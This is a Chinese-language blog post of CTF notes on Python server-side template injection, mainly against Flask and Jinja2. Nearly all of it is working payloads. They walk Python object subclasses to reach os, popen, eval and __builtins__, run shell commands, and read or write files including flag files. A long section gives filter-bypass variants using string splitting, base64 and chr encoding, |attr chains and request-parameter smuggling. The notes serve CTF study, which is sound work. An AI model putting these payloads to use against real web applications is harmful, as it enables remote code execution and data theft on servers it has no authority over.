---
title: "Python SSTI 总结笔记"
date: 2022-08-23T17:34:37+08:00
lastmod: 2022-08-23T17:34:37+08:00
draft: false
author: "X1r0z"

tags: ['python','ssti','ctf']
categories: ['web', 'CTF 笔记']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Python SSTI 的总结笔记, 不定期更新

目前大都是基于 Flask 环境复现, 其它环境后续会填坑

文章里的**所有** payload 都是自己手工复现过的

<!--more-->

## 前言

大部分的 payload 入口点都是 os linecache file open `__builtins__`

不同环境的 payload 并不相同, 主要体现在 `__subclasses__()` 中显示的内容不同

因为 `__subclasses__()` 返回的是继承自 object 的子类, 子类的数量会随着当前命名空间下导入的包/模块的不同而变化

建议大家调试的时候, 使用原生的 python 命令行, 不要用 ipython, 然后根据题目需要 import 对应模块 (flask tornado django 等)

## 基本知识

学会自己查找利用点构造 payload

通过 object 查找所有子类

```python
''.__class__.__mro__[-1].__subclasses__()
''.__class__.__base__.__base__.__subclasses__()
''.__class__.__bases__[0].__bases__[0].__subclasses__()

object.__subclasses__()
```

这里的 `''` 可以替换成 `() {} []`, 但是继承链不一定一样, 需要改一下代码

格式化输出, 方面查看索引位置

```python
for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print(i)
```

获取某个子类所在命名空间的所有内容 (子类必须重载过 `__init__`)

```python
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__
''.__class__.__mro__[-1].__subclasses__()[59].__init__.func_globals
```

Python 2 两种方式都能用

Python 3 只能用 `__globals__`

查找对应模块

```python
search = ['os', 'open', 'popen', 'linecache', '__builtins__']
for index, item in enumerate(''.__class__.__mro__[-1].__subclasses__()):
    for name in search:
        try:
            if name in item.__init__.__globals__:
                print(name, index, item)
        except:
            pass
```

有时候可能要递归查找, 这里留个坑, 遇到了再写...

### Python 2

回显如下

```python
('linecache', 59, <class 'warnings.WarningMessage'>)
('__builtins__', 59, <class 'warnings.WarningMessage'>)
('linecache', 60, <class 'warnings.catch_warnings'>)
('__builtins__', 60, <class 'warnings.catch_warnings'>)
('__builtins__', 61, <class '_weakrefset._IterationGuard'>)
('__builtins__', 62, <class '_weakrefset.WeakSet'>)
('os', 72, <class 'site._Printer'>)
('__builtins__', 72, <class 'site._Printer'>)
('os', 77, <class 'site.Quitter'>)
('__builtins__', 77, <class 'site.Quitter'>)
('open', 78, <class 'codecs.IncrementalEncoder'>)
('__builtins__', 78, <class 'codecs.IncrementalEncoder'>)
('open', 79, <class 'codecs.IncrementalDecoder'>)
('__builtins__', 79, <class 'codecs.IncrementalDecoder'>)
```

通过 os 和 linecache 包执行命令

```python
# os
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].system('whoami')
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].popen('whoami').read()

''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].__dict__['system']('whoami')
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].__dict__['popen']('whoami').read()

# linecache
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('whoami').read()
```

通过 `__builtins__` 读写文件, 导入模块, 执行代码

```python
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('D:/test.txt').read()
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('D:/test.txt').read()

''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('D:/a.txt','w').write('hello')
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('D:/a.txt','w').write('hello')

''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')

 ''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").system("whoami")')
```

另外, Python2 可以直接通过 `__subclasses__()` 下的 file 读写文件

```python
''.__class__.__mro__[-1].__subclasses__()[40]('d:/test.txt').read()
```

### Python 3

回显如下

```python
__builtins__ 100 <class '_frozen_importlib._ModuleLock'>
__builtins__ 101 <class '_frozen_importlib._DummyModuleLock'>
__builtins__ 102 <class '_frozen_importlib._ModuleLockManager'>
__builtins__ 103 <class '_frozen_importlib.ModuleSpec'>
__builtins__ 119 <class '_frozen_importlib_external.FileLoader'>
__builtins__ 120 <class '_frozen_importlib_external._NamespacePath'>
__builtins__ 121 <class '_frozen_importlib_external._NamespaceLoader'>
__builtins__ 123 <class '_frozen_importlib_external.FileFinder'>
open 125 <class 'codecs.IncrementalEncoder'>
__builtins__ 125 <class 'codecs.IncrementalEncoder'>
open 126 <class 'codecs.IncrementalDecoder'>
__builtins__ 126 <class 'codecs.IncrementalDecoder'>
open 127 <class 'codecs.StreamReaderWriter'>
__builtins__ 127 <class 'codecs.StreamReaderWriter'>
open 128 <class 'codecs.StreamRecoder'>
__builtins__ 128 <class 'codecs.StreamRecoder'>
open 143 <class 'os._wrap_close'>
popen 143 <class 'os._wrap_close'>
__builtins__ 143 <class 'os._wrap_close'>
open 144 <class 'os._AddedDllDirectory'>
popen 144 <class 'os._AddedDllDirectory'>
__builtins__ 144 <class 'os._AddedDllDirectory'>
__builtins__ 145 <class '_sitebuiltins.Quitter'>
__builtins__ 146 <class '_sitebuiltins._Printer'>
__builtins__ 148 <class 'types.DynamicClassAttribute'>
__builtins__ 149 <class 'types._GeneratorWrapper'>
__builtins__ 150 <class 'warnings.WarningMessage'>
__builtins__ 151 <class 'warnings.catch_warnings'>
__builtins__ 174 <class 'operator.attrgetter'>
__builtins__ 175 <class 'operator.itemgetter'>
__builtins__ 176 <class 'operator.methodcaller'>
__builtins__ 180 <class 'reprlib.Repr'>
__builtins__ 191 <class 'functools.partialmethod'>
__builtins__ 192 <class 'functools.singledispatchmethod'>
__builtins__ 193 <class 'functools.cached_property'>
__builtins__ 196 <class 'contextlib._GeneratorContextManagerBase'>
__builtins__ 197 <class 'contextlib._BaseExitStack'>
```

Python 3 的利用点主要在 `__builtins__` 中 (通过 eval 导入模块), 方法同上

open 和 popen 也能利用

```python
# open
''.__class__.__mro__[-1].__subclasses__()[125].__init__.__globals__['open']('d:/test.txt').read()

# popen
''.__class__.__mro__[-1].__subclasses__()[143].__init__.__globals__['popen']('whoami').read()
```

### 判断 Python 版本

```python
''.__class__.__mro__[-1].__subclasses__()
```

Python 2 开头几行

```python
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>
 ......
 <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>
 ......
```

Python 3 开头几行

```python
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>...
```

对比一下

Python 2 存在 `<type xxx>` 和 `<class xxx>`, 而 Python 3 只有 `<class xxx>`

Python 3 有 `async_generator`, 虽然 asyncio 是 3.5 引入的, 不过也能作为一个判断依据

Python 3 有`bytes_iterator`, 因为 bytes 类型有改动, 与 Python 2 相差较大

## 框架

一些常用框架的 tricks

### Flask

类: cycler joiner namespace config request session

函数: lipsum url_for get_flashed_messages

```python
config
request.environ

request.__class__.__mro__[-1]
session.__class__.__mro__[-1]

get_flashed_messages.__globals__['current_app'].config
url_for.__globals__['current_app'].config

url_for.__globals__['__builtins__']
get_flashed_messages.__globals__['__builtins__']
lipsum.__globals__['__builtins__']

undefinded.__class__.__init__.__globals__['__builtins__']
undefinded.__init__.__globals__['__builtins__']

config.__class__.__init__.__globals__['os']['popen']('whoami').read()
```

```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o'+'s').__dict__['po' + 'pen']('cat /this_is_the_f'+'lag.txt').read() }}
{%endif%}
{%endfor%}
```

### Tornado

```python
handler.settings
```

### Django

留个坑

## Bypass

### 拼接

通过 `__dict__` 绕过

```python
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('whoami')

''.__class__.__mro__[-1].__subclasses__()[40]('fl'+'ag.txt').read()
```

flask 中还能直接通过以下方式拼接字符串, 不用 `+`

```python
"fl""ag.txt"
```

### 编码

本质上还是对字符串进行操作, 可以配合 `__dict__` 从而对函数名进行编码

#### base64

```python
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('d2hvYW1p'.decode('base64')) # os.system('whoami')
```

#### ASCII

flask 环境下 chr 需要在 `__builtins__` 里面找

```python
{% set chr=''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
```

```python
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)) # os.system('whoami')
```

生成 chr payload

```python
def toChr(s):
    l = []
    for i in s:
        l.append('chr(' + str(ord(i)) + ')')
    return '+'.join(l)
```

或者用另外一种方式

格式化字符串转换 ascii 码

```python
'{:c}{:c}{:c}{:c}{:c}{:c}{:c}{:c}'.format(102,108,97,103,46,116,120,116)
```

#### 十六进制

```python
'68656c6c6f'.decode('hex') # hello
```

#### rot13

```python
'uryyb'.decode('rot13') # hello
```

### 过滤 []

使用 `__getitem__` 方法

```python
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(72).__init__.__globals__.__getitem__('os').system('whoami')
```

使用 `get()`, 仅限 dict

```python
''.__class__.__mro__.__getitem__(-1).__subclasses__().get(72).__init__.__globals__.get('os').system('whoami')
```

使用 `pop()`, 会**删数据**, 但对于这个表达式的 list 来说使用没有问题

```python
().__class__.__base__.__subclasses__().pop(72).__init__.__globals__.get('os').system('whoami')
```

使用用 `.` 访问, 仅限 dict

```python
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(72).__init__.__globals__.os.system('whoami')

''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(59).__init__.__globals__.linecache.os.popen('whoami').read()
```

Flask 环境下测试成功, 但在 python shell 中运行会报错

### 过滤 {{}}

使用`{% %}`

```python
{%if ''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].popen('whoami').read() == 'root' %}
1
{% endif %}
```

在 `{% %}` 中语句的输出内容无法回显, 只能盲注或者用 dnslog 回显

### 过滤引号

chr, 上面提到过

```python
# flask environment
{% set chr=().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
```

```python
''.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[chr(111)+chr(115)].__dict__[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)) # os.system('whoami')
```

还可以通过 request 对象逃逸

```python
().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[request.args.os].popen(request.args.cmd).read()
```

get 传入 `os=os&cmd=whoami` 即可

### 过滤下划线

利用 request + `[]` 绕过

```python
{{ ''[request.args.class][request.args.mro][-1][request.args.subclasses]()[40]('d:/test.txt').read() }}
```

get 传入 `class=__class__&mro=__mro__&subclasses=__subclasses__`

利用 `|attr` 绕过

```python
{{ (()|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()).pop(40)('d:/test.txt').read() }}
```

get 传入 `class=__class__&base=__base__&subclasses=__subclasses__`

### 过滤 .

利用 `[] ` 绕过

```python
{{ ''['__class__']['__mro__'][-1]['__subclasses__']()[72]['__init__']['__globals__']['os']['popen']('whoami')['read']() }}
```

利用 `|attr` 绕过

```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(59)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```
